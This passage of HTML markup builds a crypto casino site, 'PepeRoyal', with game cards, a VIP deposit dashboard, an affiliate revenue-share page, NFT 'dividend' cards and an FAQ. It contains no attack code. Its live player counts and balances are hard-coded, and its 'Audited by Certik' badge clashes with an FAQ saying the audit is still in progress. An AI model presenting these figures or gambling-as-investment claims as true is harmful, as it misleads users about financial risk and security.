            <h3 class="text-2xl font-black text-white brand-font flex items-center gap-2">
                <span class="text-gold">///</span> PREMIUM GAMES
            </h3>
        </div>
        <button class="text-[10px] font-bold text-gold hover:text-white uppercase border border-gold/30 px-3 py-1.5 rounded hover:bg-gold/10 transition">See All</button>
    </div>
    
    <div class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-4">
        
        <!-- PLINKO -->
        <div onclick="loadGame('games/plinko.html', 'Plinko')" class="game-card group relative aspect-[3/4] rounded bg-[#0e0e0e] overflow-hidden cursor-pointer">
            <!-- Live Badge -->
            <div class="absolute top-2 right-2 z-10 bg-black/80 backdrop-blur-sm px-2 py-1 rounded border border-white/10 flex items-center gap-1.5 shadow-lg">
                <span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse shadow-[0_0_8px_#22c55e]"></span>
                <span class="text-[9px] font-bold text-gray-300 font-mono">428 Playing</span>
            </div>
            
            <img src="assets/img/game-plinko.png" onerror="this.src='https://placehold.co/400x600/121212/FFD700?text=PLINKO'" class="w-full h-full object-cover opacity-60 group-hover:opacity-100 transition duration-500 grayscale group-hover:grayscale-0" alt="Plinko">
            <div class="absolute inset-0 bg-gradient-to-t from-black via-transparent to-transparent"></div>
            <div class="absolute bottom-3 left-3">
                <h4 class="font-bold text-white text-sm uppercase">Plinko</h4>
                <p class="text-[9px] text-gold">High Volatility</p>
            </div>
        </div>
        
        <!-- CRASH -->
        <div onclick="loadGame('games/crash.html', 'Crash')" class="game-card group relative aspect-[3/4] rounded bg-[#0e0e0e] overflow-hidden cursor-pointer">
            <!-- Live Badge -->
            <div class="absolute top-2 right-2 z-10 bg-black/80 backdrop-blur-sm px-2 py-1 rounded border border-white/10 flex items-center gap-1.5 shadow-lg">
                <span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse shadow-[0_0_8px_#22c55e]"></span>
                <span class="text-[9px] font-bold text-gray-300 font-mono">1,205 Playing</span>
            </div>

            <img src="assets/img/game-crash.png" onerror="this.src='https://placehold.co/400x600/121212/FFD700?text=CRASH'" class="w-full h-full object-cover opacity-60 group-hover:opacity-100 transition duration-500 grayscale group-hover:grayscale-0" alt="Crash">
            <div class="absolute inset-0 bg-gradient-to-t from-black via-transparent to-transparent"></div>
            <div class="absolute bottom-3 left-3">
                <h4 class="font-bold text-white text-sm uppercase">Crash</h4>
                <p class="text-[9px] text-gold">Multiplayer</p>
            </div>
        </div>

        <!-- BLACKJACK -->
        <div onclick="loadGame('games/blackjack.html', 'Blackjack')" class="game-card group relative aspect-[3/4] rounded bg-[#0e0e0e] overflow-hidden cursor-pointer">
            <!-- Live Badge -->
            <div class="absolute top-2 right-2 z-10 bg-black/80 backdrop-blur-sm px-2 py-1 rounded border border-white/10 flex items-center gap-1.5 shadow-lg">
                <span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse shadow-[0_0_8px_#22c55e]"></span>
                <span class="text-[9px] font-bold text-gray-300 font-mono">89 Playing</span>
            </div>

            <img src="assets/img/game-blackjack.png" onerror="this.src='https://placehold.co/400x600/121212/FFD700?text=BLACKJACK'" class="w-full h-full object-cover opacity-60 group-hover:opacity-100 transition duration-500 grayscale group-hover:grayscale-0" alt="Blackjack">
            <div class="absolute inset-0 bg-gradient-to-t from-black via-transparent to-transparent"></div>
            <div class="absolute bottom-3 left-3">
                <h4 class="font-bold text-white text-sm uppercase">Blackjack</h4>
                <p class="text-[9px] text-gold">Strategy</p>
            </div>
        </div>

        <!-- MINES -->
        <div onclick="loadGame('games/mines.html', 'Mines')" class="game-card group relative aspect-[3/4] rounded bg-[#0e0e0e] overflow-hidden cursor-pointer">
            <!-- Live Badge -->
            <div class="absolute top-2 right-2 z-10 bg-black/80 backdrop-blur-sm px-2 py-1 rounded border border-white/10 flex items-center gap-1.5 shadow-lg">
                <span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse shadow-[0_0_8px_#22c55e]"></span>
                <span class="text-[9px] font-bold text-gray-300 font-mono">312 Playing</span>
            </div>

            <img src="assets/img/game-mines.png" onerror="this.src='https://placehold.co/400x600/121212/FFD700?text=MINES'" class="w-full h-full object-cover opacity-60 group-hover:opacity-100 transition duration-500 grayscale group-hover:grayscale-0" alt="Mines">
            <div class="absolute inset-0 bg-gradient-to-t from-black via-transparent to-transparent"></div>
            <div class="absolute bottom-3 left-3">
                <h4 class="font-bold text-white text-sm uppercase">Mines</h4>
                <p class="text-[9px] text-gold">Luck</p>
            </div>
        </div>

        <!-- LIMBO -->
        <div onclick="loadGame('games/limbo.html', 'Limbo')" class="game-card group relative aspect-[3/4] rounded bg-[#0e0e0e] overflow-hidden cursor-pointer">
            <!-- Live Badge -->
            <div class="absolute top-2 right-2 z-10 bg-black/80 backdrop-blur-sm px-2 py-1 rounded border border-white/10 flex items-center gap-1.5 shadow-lg">
                <span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse shadow-[0_0_8px_#22c55e]"></span>
                <span class="text-[9px] font-bold text-gray-300 font-mono">156 Playing</span>
            </div>

            <img src="assets/img/game-limbo.png" onerror="this.src='https://placehold.co/400x600/121212/FFD700?text=LIMBO'" class="w-full h-full object-cover opacity-60 group-hover:opacity-100 transition duration-500 grayscale group-hover:grayscale-0" alt="Limbo">
            <div class="absolute inset-0 bg-gradient-to-t from-black via-transparent to-transparent"></div>
            <div class="absolute bottom-3 left-3">
                <h4 class="font-bold text-white text-sm uppercase">Limbo</h4>
                <p class="text-[9px] text-gold">Unlimited Win</p>
            </div>
        </div>

        <!-- DICE -->
        <div onclick="loadGame('games/dice.html', 'Dice')" class="game-card group relative aspect-[3/4] rounded bg-[#0e0e0e] overflow-hidden cursor-pointer">
            <!-- Live Badge -->
            <div class="absolute top-2 right-2 z-10 bg-black/80 backdrop-blur-sm px-2 py-1 rounded border border-white/10 flex items-center gap-1.5 shadow-lg">
                <span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse shadow-[0_0_8px_#22c55e]"></span>
                <span class="text-[9px] font-bold text-gray-300 font-mono">540 Playing</span>
            </div>

            <img src="assets/img/game-dice.png" onerror="this.src='https://placehold.co/400x600/121212/FFD700?text=DICE'" class="w-full h-full object-cover opacity-60 group-hover:opacity-100 transition duration-500 grayscale group-hover:grayscale-0" alt="Dice">
            <div class="absolute inset-0 bg-gradient-to-t from-black via-transparent to-transparent"></div>
            <div class="absolute bottom-3 left-3">
                <h4 class="font-bold text-white text-sm uppercase">Dice</h4>
                <p class="text-[9px] text-gold">Instant</p>
                </div>
            </div>
         </div>
     </div>
</div>

            <!-- VIP DASHBOARD / INVESTOR HUB -->
<div id="profileSection" class="hidden w-full max-w-7xl mx-auto p-4 md:p-8 fade-in flex-1">
    
    <!-- Header: Saludo Personalizado + Estatus del Sistema -->
    <div class="flex flex-col md:flex-row md:items-end justify-between gap-4 mb-10 border-b border-white/5 pb-6">
        <div>
            <h2 class="text-4xl font-black text-white brand-font uppercase tracking-wide mb-1">
                Command <span class="text-transparent bg-clip-text bg-gradient-to-r from-gold to-yellow-200">Center</span>
            </h2>
            <p class="text-gray-400 text-sm font-light">Institutional Grade Asset Management</p>
        </div>
        <!-- System Status Badge -->
        <div class="flex items-center gap-3 bg-[#111] border border-gold/20 px-4 py-2 rounded-full shadow-[0_0_20px_rgba(255,215,0,0.05)]">
            <span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
            <span class="text-xs text-gray-300 font-mono">SYSTEM: <span class="text-green-400 font-bold">ONLINE</span></span>
            <span class="text-gray-600">|</span>
            <span class="text-xs text-gold font-bold">ETH GAS: 12 Gwei</span>
        </div>
    </div>
    
    <div class="grid lg:grid-cols-12 gap-8">
        
        <!-- LEFT COLUMN: Identity & VIP Status (Col-Span 4) -->
        <div class="lg:col-span-4 space-y-6">
            <!-- ID Card "Black Card Style" -->
            <div class="bg-gradient-to-b from-[#1a1a1a] to-[#0a0a0a] border border-white/10 rounded-2xl p-0 overflow-hidden relative group shadow-2xl">
                <!-- Decorative background blur -->
                <div class="absolute top-0 right-0 w-32 h-32 bg-gold/10 rounded-full blur-[50px]"></div>
                
                <div class="p-8 text-center relative z-10">
                    <div class="relative inline-block">
                        <div class="w-28 h-28 rounded-full p-[2px] bg-gradient-to-b from-gold to-transparent mx-auto mb-4">
                            <img src="https://api.dicebear.com/9.x/avataaars/svg?seed=WhaleKing" class="w-full h-full rounded-full bg-black object-cover shadow-inner">
                        </div>
                        <span class="absolute bottom-4 right-0 bg-gold text-black text-[10px] font-black px-2 py-0.5 rounded shadow-lg border border-white/20">VIP</span>
                    </div>
                    
                    <h3 class="text-2xl font-bold text-white mb-1" id="profileName">Whale_0x99</h3>
                    <p class="text-gray-500 text-xs font-mono mb-6 truncate flex justify-center items-center gap-2">
                        0x71C...9A23 <i class="fas fa-copy cursor-pointer hover:text-white transition"></i>
                    </p>
                    
                    <!-- VIP Tier Progress -->
                    <div class="bg-black/40 rounded-xl p-4 border border-white/5 text-left relative overflow-hidden">
                        <div class="flex justify-between items-end mb-2 relative z-10">
                            <div>
                                <p class="text-[10px] text-gray-500 uppercase tracking-widest mb-1">Current Status</p>
                                <p class="text-gold font-black uppercase text-lg italic">DIAMOND HANDS</p>
                            </div>
                            <i class="fas fa-crown text-gold/20 text-3xl"></i>
                        </div>
                        <div class="w-full bg-[#333] h-1.5 rounded-full mb-2 overflow-hidden relative z-10">
                            <div class="bg-gradient-to-r from-gold to-yellow-600 h-full w-[75%] shadow-[0_0_10px_#FFD700]"></div>
                        </div>
                        <p class="text-[10px] text-gray-400 relative z-10">Wager <span class="text-white">$24,500</span> more to unlock <span class="text-white">Black Card</span>.</p>
                    </div>
                </div>

                <!-- Perks List (Selling the Investment) -->
                <div class="bg-[#111] p-6 border-t border-white/5">
                    <h4 class="text-xs font-bold text-gray-400 uppercase mb-3 tracking-wider">Active Privileges</h4>
                    <ul class="space-y-3">
                        <li class="flex items-center text-xs text-gray-300">
                            <div class="w-5 h-5 rounded-full bg-gold/10 flex items-center justify-center mr-3 border border-gold/20"><i class="fas fa-check text-gold text-[8px]"></i></div>
                            2.5% Rakeback on all losses
                        </li>
                        <li class="flex items-center text-xs text-gray-300">
                            <div class="w-5 h-5 rounded-full bg-gold/10 flex items-center justify-center mr-3 border border-gold/20"><i class="fas fa-check text-gold text-[8px]"></i></div>
                            Priority Withdrawals (Instant)
                        </li>
                        <li class="flex items-center text-xs text-gray-300">
                            <div class="w-5 h-5 rounded-full bg-gold/10 flex items-center justify-center mr-3 border border-gold/20"><i class="fas fa-check text-gold text-[8px]"></i></div>
                            <span>RevShare Access <span class="text-green-500 font-bold ml-1">(Active)</span></span>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
        
        <!-- RIGHT COLUMN: Financials & Action (Col-Span 8) -->
        <div class="lg:col-span-8 space-y-6">
            
            <!-- Financial Stats Row -->
            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                <!-- Portfolio -->
                <div class="bg-[#0f0f0f] border border-white/5 p-5 rounded-xl relative overflow-hidden group hover:border-gold/30 transition-all">
                    <div class="absolute right-0 top-0 p-4 opacity-5 group-hover:opacity-10 transition"><i class="fas fa-wallet text-4xl text-white"></i></div>
                    <p class="text-gray-500 text-[10px] font-bold uppercase tracking-wider mb-1">Portfolio Value</p>
                    <h4 class="text-2xl font-mono text-white tracking-tight">$<span id="totalPortfolio">12,450.00</span></h4>
                    <span class="text-[10px] text-green-500 flex items-center gap-1 mt-1 font-bold bg-green-500/10 px-2 py-0.5 rounded w-fit"><i class="fas fa-arrow-up"></i> +4.2% (24h)</span>
                </div>
                
                <!-- Dividends (The Hook) -->
                <div class="bg-[#0f0f0f] border border-gold/20 p-5 rounded-xl relative overflow-hidden group hover:bg-gold/5 transition-all shadow-[0_0_20px_rgba(255,215,0,0.05)]">
                    <div class="absolute right-0 top-0 p-4 opacity-10 group-hover:opacity-20 transition"><i class="fas fa-chart-line text-4xl text-gold"></i></div>
                    <p class="text-gold/70 text-[10px] font-bold uppercase tracking-wider mb-1">Dividends Earned</p>
                    <h4 class="text-2xl font-mono text-gold tracking-tight">$<span id="dividends">845.20</span></h4>
                    <span class="text-[10px] text-gray-400 mt-1 flex items-center gap-1"><span class="w-1.5 h-1.5 bg-gold rounded-full animate-pulse"></span> Ready to claim</span>
                </div>

                <!-- Volume -->
                <div class="bg-[#0f0f0f] border border-white/5 p-5 rounded-xl relative overflow-hidden group hover:border-gold/30 transition-all">
                    <div class="absolute right-0 top-0 p-4 opacity-5 group-hover:opacity-10 transition"><i class="fas fa-dice text-4xl text-white"></i></div>
                    <p class="text-gray-500 text-[10px] font-bold uppercase tracking-wider mb-1">Total Wagered</p>
                    <h4 class="text-2xl font-mono text-white tracking-tight">$<span id="wagered">154,000</span></h4>
                    <span class="text-[10px] text-gray-400 mt-1">Lifetime Volume</span>
                </div>
            </div>

            <!-- The Main Banking Interface (Replaces Simple Cashier) -->
            <div class="bg-[#0f0f0f] border border-white/10 rounded-xl relative overflow-hidden shadow-2xl">
                <!-- Tabs Header -->
                <div class="flex border-b border-white/5 bg-[#0a0a0a]">
                    <button class="flex-1 py-4 text-xs md:text-sm font-bold text-black bg-gold uppercase tracking-wider hover:bg-yellow-400 transition shadow-[inset_0_-2px_10px_rgba(0,0,0,0.2)]">
                        <i class="fas fa-plus-circle mr-2"></i> Deposit
                    </button>
                    <button class="flex-1 py-4 text-xs md:text-sm font-bold text-gray-500 bg-[#050505] uppercase tracking-wider hover:text-white hover:bg-[#1a1a1a] transition border-r border-white/5">
                        <i class="fas fa-arrow-circle-down mr-2"></i> Withdraw
                    </button>
                    <button class="flex-1 py-4 text-xs md:text-sm font-bold text-gray-500 bg-[#050505] uppercase tracking-wider hover:text-white hover:bg-[#1a1a1a] transition">
                        <i class="fas fa-exchange-alt mr-2"></i> Swap
                    </button>
                </div>

                <div class="p-6 md:p-8">
                    <!-- Deposit Interface -->
                    <div class="flex flex-col md:flex-row gap-8 items-start">
                        
                        <!-- Left: Input Area -->
                        <div class="flex-1 w-full space-y-5">
                            <div class="flex justify-between text-xs mb-1">
                                <span class="text-gray-400 font-bold uppercase">Asset Amount</span>
                                <span class="text-gray-400">Wallet Balance: <span class="text-white font-mono" id="cashierWalletBal">0.00</span> <span class="text-gold">PBJ</span></span>
                            </div>
                            
                            <!-- Custom Input Group -->
                            <div class="relative group">
                                <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
                                    <span class="text-gray-500 font-bold text-lg">$</span>
                                </div>
                                <input type="number" id="depositInput" placeholder="0.00" class="block w-full pl-8 pr-20 py-4 bg-[#050505] border border-white/10 rounded-lg text-white font-mono text-2xl focus:border-gold focus:ring-1 focus:ring-gold transition-all outline-none shadow-inner" placeholder="5,000">
                                <div class="absolute inset-y-0 right-0 flex items-center">
                                    <button class="h-full px-4 text-gold text-xs font-bold border-l border-white/10 hover:bg-white/5 transition tracking-wider">MAX</button>
                                </div>
                            </div>
                            
                            <!-- Quick Amounts -->
                            <div class="flex gap-2">
                                <button class="flex-1 bg-[#1a1a1a] border border-white/5 rounded py-2 text-xs text-gray-400 hover:text-white hover:border-white/20 transition font-mono font-bold">$100</button>
                                <button class="flex-1 bg-[#1a1a1a] border border-white/5 rounded py-2 text-xs text-gray-400 hover:text-white hover:border-white/20 transition font-mono font-bold">$500</button>
                                <button class="flex-1 bg-[#1a1a1a] border border-white/5 rounded py-2 text-xs text-gray-400 hover:text-white hover:border-white/20 transition font-mono font-bold">$1k</button>
                                <button class="flex-1 bg-[#1a1a1a] border border-white/5 rounded py-2 text-xs text-gray-400 hover:text-white hover:border-white/20 transition font-bold text-gold">Custom</button>
                            </div>
                        </div>

                        <!-- Divider / Info -->
                        <div class="hidden md:block w-px h-40 bg-gradient-to-b from-transparent via-white/10 to-transparent"></div>

                        <!-- Right: Summary & CTA -->
                        <div class="w-full md:w-1/3 space-y-4 pt-1">
                            <div class="bg-gold/5 rounded-lg p-4 border border-gold/10">
                                <div class="flex justify-between text-xs text-gray-400 mb-2">
                                    <span>Exchange Rate</span>
                                    <span class="text-white font-mono">1 $PBJ = $0.01</span>
                                </div>
                                <div class="flex justify-between text-xs text-gray-400 mb-2">
                                    <span>Est. Gas Fee</span>
                                    <span class="text-white font-mono">~$0.25</span>
                                </div>
                                <div class="h-px bg-white/10 my-3"></div>
                                <div class="flex justify-between text-sm text-gold font-bold">
                                    <span>Game Balance</span>
                                    <span class="font-mono" id="cashierGameBal">0.00</span>
                                </div>
                            </div>
                            <button onclick="depositChips()" class="w-full bg-gradient-to-r from-gold to-yellow-600 text-black font-black py-4 rounded-lg hover:shadow-[0_0_20px_rgba(255,215,0,0.3)] transform hover:-translate-y-1 transition-all uppercase tracking-widest text-xs flex items-center justify-center gap-2 group">
                                Execute Deposit <i class="fas fa-arrow-right group-hover:translate-x-1 transition"></i>
                            </button>
                            <p class="text-[9px] text-center text-gray-500 mt-2">By depositing you agree to the <a href="#" class="text-gray-400 hover:text-white underline">T&C</a>.</p>
                        </div>
                    </div>
                </div>
                
                <!-- Security Badge Bottom -->
                <div class="bg-[#080808] p-3 border-t border-white/5 flex justify-center items-center gap-6">
                    <span class="text-[10px] text-gray-500 uppercase flex items-center gap-1.5"><i class="fas fa-shield-alt text-green-500"></i> Audited by Certik</span>
                    <span class="text-[10px] text-gray-500 uppercase flex items-center gap-1.5"><i class="fas fa-lock text-gold"></i> SSL Secured</span>
                </div>
            </div>
        </div>
    </div>
</div>
        

            <!-- AFFILIATES SECTION REDESIGNED -->
<div id="partnersSection" class="hidden w-full max-w-6xl mx-auto p-4 md:p-8 fade-in flex-1">
    
    <!-- Header Hero -->
    <div class="text-center mb-10 relative">
        <div class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-[500px] h-[300px] bg-gold/10 blur-[100px] rounded-full pointer-events-none"></div>
        <h2 class="text-4xl md:text-6xl font-black text-white brand-font uppercase mb-2 drop-shadow-lg">
            PARTNER <span class="text-transparent bg-clip-text bg-gradient-to-r from-[#FFD700] to-[#B8860B]">PROGRAM</span>
        </h2>
        <p class="text-gray-400 text-sm max-w-2xl mx-auto">
            Become the house. Invite players and earn up to <span class="text-gold font-bold">50% Revenue Share</span> instantly.
            Your passive income machine starts here.
        </p>
    </div>

    <!-- Stats Dashboard (Simulated/Real Data) -->
    <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
        <!-- Commission Rate -->
        <div class="bg-[#121212] border border-gold/30 p-4 rounded-xl relative overflow-hidden group hover:bg-[#1a1a1a] transition">
            <div class="absolute -right-4 -top-4 text-gold/10 text-6xl group-hover:scale-110 transition"><i class="fas fa-percent"></i></div>
            <p class="text-[10px] text-gray-500 uppercase font-bold tracking-wider">My Commission</p>
            <p class="text-2xl font-black text-white mt-1">30%</p>
        </div>
        
        <!-- Total Referred -->
        <div class="bg-[#121212] border border-white/5 p-4 rounded-xl relative overflow-hidden group hover:bg-[#1a1a1a] transition">
            <div class="absolute -right-4 -top-4 text-gray-700/20 text-6xl"><i class="fas fa-users"></i></div>
            <p class="text-[10px] text-gray-500 uppercase font-bold tracking-wider">Total Referred</p>
            <p class="text-2xl font-black text-white mt-1" id="affTotalRefs">0</p>
        </div>

        <!-- Total Earned -->
        <div class="bg-[#121212] border border-white/5 p-4 rounded-xl relative overflow-hidden group hover:bg-[#1a1a1a] transition">
            <div class="absolute -right-4 -top-4 text-gray-700/20 text-6xl"><i class="fas fa-coins"></i></div>
            <p class="text-[10px] text-gray-500 uppercase font-bold tracking-wider">Total Earned</p>
            <p class="text-2xl font-black text-gold mt-1 font-mono" id="affTotalEarned">0.00</p>
        </div>

        <!-- Claimable -->
        <div class="bg-gradient-to-br from-gold/20 to-black border border-gold p-4 rounded-xl relative flex flex-col justify-between">
            <div>
                <p class="text-[10px] text-gold uppercase font-bold tracking-wider">Unclaimed Rewards</p>
                <p class="text-2xl font-black text-white mt-1 font-mono" id="affUnclaimed">0.00 PBJ</p>
            </div>
            <button onclick="claimAffiliateRewards()" class="mt-3 w-full bg-gold text-black text-xs font-bold py-2 rounded hover:bg-white transition uppercase">
                CLAIM NOW
            </button>
        </div>
    </div>

    <!-- Link Generation & Tiers -->
    <div class="grid lg:grid-cols-3 gap-8">
        
        <!-- Columna Izquierda: Link Generator -->
        <div class="lg:col-span-2 space-y-6">
            <div class="bg-[#0e0e0e] border border-white/10 rounded-xl p-6 relative overflow-hidden">
                <h3 class="text-lg font-bold text-white mb-4 flex items-center gap-2">
                    <i class="fas fa-link text-gold"></i> Your Referral Link
                </h3>
                
                <div class="flex flex-col md:flex-row gap-2">
                    <div class="flex-1 bg-black border border-white/10 rounded-lg flex items-center px-4 py-3">
                        <input type="text" id="referralLinkInput" value="Connect wallet to generate" class="bg-transparent w-full text-gray-300 text-xs font-mono outline-none" readonly>
                    </div>
                    <button onclick="copyRefLink()" class="bg-white text-black font-bold px-6 py-3 rounded-lg hover:bg-gray-200 transition text-xs uppercase shadow-lg flex items-center justify-center gap-2">
                        <i class="fas fa-copy"></i> Copy
                    </button>
                </div>

                <div class="mt-4 flex gap-2">
                    <button onclick="shareSocial('twitter')" class="flex-1 bg-[#1DA1F2]/10 text-[#1DA1F2] border border-[#1DA1F2]/30 py-2 rounded text-xs font-bold hover:bg-[#1DA1F2] hover:text-white transition">
                        <i class="fab fa-twitter mr-2"></i> Share on X
                    </button>
                    <button onclick="shareSocial('telegram')" class="flex-1 bg-[#0088cc]/10 text-[#0088cc] border border-[#0088cc]/30 py-2 rounded text-xs font-bold hover:bg-[#0088cc] hover:text-white transition">
                        <i class="fab fa-telegram mr-2"></i> Telegram
                    </button>
                </div>
            </div>

            <!-- FAQ Mini -->
            <div class="grid md:grid-cols-2 gap-4">
                <div class="bg-[#121212] p-4 rounded border border-white/5">
                    <h4 class="text-gold font-bold text-xs uppercase mb-2">How it works?</h4>
                    <p class="text-[10px] text-gray-500 leading-relaxed">Share your link. When users play, you earn a percentage of the House Edge on every bet, win or lose. Rewards are paid in $PBJ instantly.</p>
                </div>
                <div class="bg-[#121212] p-4 rounded border border-white/5">
                    <h4 class="text-gold font-bold text-xs uppercase mb-2">When do I get paid?</h4>
                    <p class="text-[10px] text-gray-500 leading-relaxed">There is no lock-up period. You can claim your accumulated rewards at any time directly to your wallet.</p>
                </div>
            </div>
        </div>

        <!-- Columna Derecha: Tier System -->
        <div class="bg-[#0e0e0e] border border-white/10 rounded-xl p-6 h-full">
            <h3 class="text-lg font-bold text-white mb-6 uppercase tracking-wide">Comission <span class="text-gold">Tiers</span></h3>
            
            <div class="space-y-4 relative">
                <!-- Linea conectora -->
                <div class="absolute left-[15px] top-4 bottom-4 w-0.5 bg-gray-800 z-0"></div>

                <!-- Tier 1 -->
                <div class="relative z-10 flex gap-4 items-center opacity-100">
                    <div class="w-8 h-8 rounded-full bg-gray-700 border-2 border-gray-500 flex items-center justify-center text-xs font-bold shadow-[0_0_10px_rgba(255,255,255,0.1)]">1</div>
                    <div class="flex-1 bg-[#1a1a1a] p-3 rounded border-l-2 border-gray-500">
                        <div class="flex justify-between items-center">
                            <span class="text-xs font-bold text-white uppercase">Standard</span>
                            <span class="text-sm font-black text-gray-400">30%</span>
                        </div>
                        <p class="text-[9px] text-gray-600">Start here. No requirement.</p>
                    </div>
                </div>

                <!-- Tier 2 -->
                <div class="relative z-10 flex gap-4 items-center">
                    <div class="w-8 h-8 rounded-full bg-yellow-900 border-2 border-gold flex items-center justify-center text-xs font-bold text-gold shadow-[0_0_15px_rgba(255,215,0,0.2)]">2</div>
                    <div class="flex-1 bg-[#1a1a1a] p-3 rounded border-l-2 border-gold">
                        <div class="flex justify-between items-center">
                            <span class="text-xs font-bold text-gold uppercase">Gold Elite</span>
                            <span class="text-sm font-black text-gold">40%</span>
                        </div>
                        <p class="text-[9px] text-gray-500">Wager $100k+ Volume</p>
                    </div>
                </div>

                <!-- Tier 3 -->
                <div class="relative z-10 flex gap-4 items-center">
                    <div class="w-8 h-8 rounded-full bg-purple-900 border-2 border-purple-500 flex items-center justify-center text-xs font-bold text-purple-300 shadow-[0_0_15px_rgba(168,85,247,0.4)] animate-pulse">3</div>
                    <div class="flex-1 bg-gradient-to-r from-[#1a1a1a] to-purple-900/20 p-3 rounded border-l-2 border-purple-500">
                        <div class="flex justify-between items-center">
                            <span class="text-xs font-bold text-purple-400 uppercase">Whale Partner</span>
                            <span class="text-sm font-black text-purple-400">50%</span>
                        </div>
                        <p class="text-[9px] text-gray-500">Wager $1M+ or Custom Deal</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

            <!-- NFT SECTION -->
            <div id="nftSection" class="hidden w-full max-w-7xl mx-auto p-4 md:p-8 fade-in flex-1">
                <div class="flex flex-col md:flex-row justify-between items-end mb-10 border-b border-white/5 pb-6">
                    <div>
                        <h2 class="text-3xl font-black text-white brand-font mb-2 uppercase tracking-wide">MEMBERSHIP <span class="text-gold">CARDS</span></h2>
                        <p class="text-gray-400 text-xs">Own a piece of the casino floor. Limited Supply.</p>
                    </div>
                    <div class="flex gap-2 mt-4 md:mt-0 bg-[#121212] p-1 rounded border border-white/5">
                        <button onclick="switchNftTab('mint')" id="tabMint" class="px-6 py-2 rounded font-bold text-[10px] bg-gold text-black shadow-lg transition uppercase tracking-wider">Mint New</button>
                        <button onclick="switchNftTab('inventory')" id="tabInventory" class="px-6 py-2 rounded font-bold text-[10px] text-gray-400 hover:text-white transition uppercase tracking-wider">My Cards</button>
                    </div>
                </div>
                <div id="nftMintView" class="grid md:grid-cols-2 lg:grid-cols-4 gap-6"></div>
                <div id="nftInventoryView" class="hidden">
                    <div class="bg-[#121212] border border-gold/20 rounded p-6 mb-8 flex flex-col md:flex-row justify-between items-center gap-4">
                        <div>
                            <p class="text-[10px] text-gray-500 uppercase font-bold tracking-wider">Accumulated Dividends</p>
                            <p class="text-3xl font-black text-white font-mono tracking-tight"><span id="pendingRewards">0.00</span> <span class="text-gold text-lg">PBJ</span></p>
                        </div>
                        <button onclick="claimRewards()" class="bg-white text-black px-8 py-3 rounded hover:bg-gray-200 font-bold text-xs uppercase shadow-lg">CLAIM TO WALLET</button>
                    </div>
                    <div id="myNftGrid" class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-4">
                        <div class="col-span-full text-center py-20">
                            <i class="fas fa-search text-4xl text-gray-800 mb-4"></i>
                            <p class="text-gray-600 text-sm">Connect wallet to view your assets.</p>
                        </div>
                    </div>
                </div>
            </div>

            <!-- FAQ SECTION -->
<div class="mt-20 mb-10 border-t border-white/5 pt-10">
    <h3 class="text-2xl font-black text-white brand-font text-center mb-8 uppercase">Frequently Asked <span class="text-gold">Questions</span></h3>
    
    <div class="grid md:grid-cols-2 gap-4">
        <!-- Q1 -->
        <div class="bg-[#121212] p-5 rounded border border-white/5 hover:border-gold/30 transition">
            <h4 class="text-white font-bold text-xs uppercase mb-2 flex items-center gap-2"><i class="fas fa-question-circle text-gold"></i> When can I claim my tokens?</h4>
            <p class="text-[11px] text-gray-400 leading-relaxed">Tokens will be claimable immediately after the presale ends. We will announce the exact Claim Portal opening 24h before listing on Uniswap.</p>
        </div>
        <!-- Q2 -->
        <div class="bg-[#121212] p-5 rounded border border-white/5 hover:border-gold/30 transition">
            <h4 class="text-white font-bold text-xs uppercase mb-2 flex items-center gap-2"><i class="fas fa-shield-alt text-gold"></i> Is the contract audited?</h4>
            <p class="text-[11px] text-gray-400 leading-relaxed">Yes. Our smart contract has undergone rigorous testing. The preliminary audit by CertiK is in progress and the report will be linked in the footer soon.</p>
        </div>
        <!-- Q3 -->
        <div class="bg-[#121212] p-5 rounded border border-white/5 hover:border-gold/30 transition">
            <h4 class="text-white font-bold text-xs uppercase mb-2 flex items-center gap-2"><i class="fas fa-chart-line text-gold"></i> How does RevShare work?</h4>
            <p class="text-[11px] text-gray-400 leading-relaxed">50% of all casino profits (House Edge) are used to buy back $PBJ from the market. These tokens are distributed to NFT holders and Stakers weekly.</p>
        </div>
        <!-- Q4 -->
        <div class="bg-[#121212] p-5 rounded border border-white/5 hover:border-gold/30 transition">
            <h4 class="text-white font-bold text-xs uppercase mb-2 flex items-center gap-2"><i class="fas fa-network-wired text-gold"></i> Why Base Chain?</h4>
            <p class="text-[11px] text-gray-400 leading-relaxed">Base offers ultra-low fees and high speed, perfect for a casino. Plus, it's backed by Coinbase, bringing millions of users to the ecosystem.</p>
        </div>
    </div>
</div>

            <!-- FOOTER -->
            <footer class="bg-[#020202] border-t border-white/5 py-12 mt-auto shrink-0 relative z-10">
                <div class="max-w-7xl mx-auto px-6 text-center md:text-left">
                    <div class="flex flex-col md:flex-row justify-between items-center gap-6">
                        <div>
                            <h4 class="text-2xl font-black text-white brand-font italic">PEPE<span class="text-gold">ROYAL</span></h4>
                            <p class="text-gray-600 text-[10px] mt-2 uppercase tracking-widest">The King of Base Chain</p>
                        </div>
                    </div>
                    <div class="mt-8 pt-8 border-t border-white/5 text-[10px] text-gray-700 text-center uppercase tracking-wide">
                        춸 2025 PepeRoyal DAO. 18+. Gamble Responsibly.
                    </div>
                </div>
            </footer>
        </main>

        <!-- 4. RIGHT CHAT SIDEBAR -->
        <aside id="chatSidebar" class="chat-sidebar w-80">
            <div class="h-14 border-b border-white/5 flex justify-between items-center px-4 bg-[#080808] shrink-0">
                <span class="font-bold text-gray-400 text-[10px] uppercase tracking-widest flex items-center gap-2">
                    <i class="fas fa-circle text-gold text-[6px] animate-pulse"></i> VIP Lounge
                </span>
                <button class="lg:hidden text-gray-500" onclick="toggleChat()"><i class="fas fa-times"></i></button>
            </div>
            <div id="chatMessages" class="flex-1 overflow-y-auto p-4 space-y-4 custom-scrollbar bg-[#050505]"></div>
